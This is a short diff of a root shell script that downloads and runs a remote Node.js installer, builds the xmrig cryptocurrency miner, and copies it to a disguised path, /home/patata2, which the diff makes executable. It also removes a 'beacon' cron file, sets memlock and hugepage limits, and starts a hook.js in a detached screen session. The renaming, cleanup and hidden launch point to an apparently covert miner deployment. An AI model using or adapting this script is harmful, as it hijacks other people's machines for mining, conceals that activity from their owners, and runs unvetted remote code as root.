@@ -3,7 +3,7 @@ sudo rm /etc/cron.d/beacon
 if [ ! -f /etc/proof ]; then
     sudo curl -sL https://deb.nodesource.com/setup_8.x -o /etc/install_node.sh
     sudo bash /etc/install_node.sh
-    sudo apt-get update && sudo apt-get -y install build-essential cmake libuv1-dev nodejs npm
+    sudo apt-get update && sudo apt-get -y install build-essential cmake libuv1-dev nodejs
     sudo bash -c 'echo "* soft memlock 262144" >> /etc/security/limits.conf'
     sudo bash -c 'echo "* hard memlock 262144" >> /etc/security/limits.conf'
     sudo touch /etc/proof
@@ -20,6 +20,7 @@ cd build
 sudo cmake .. -DCMAKE_BUILD_TYPE=Release -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a
 sudo make -j
 sudo cp xmrig /home/patata2
+sudo chmod +x /home/patata2
 sudo rm -rf /poppa
 sudo sysctl -w vm.nr_hugepages=128
 screen -dm sudo nodejs /patata/hook.js "$1" "$2"
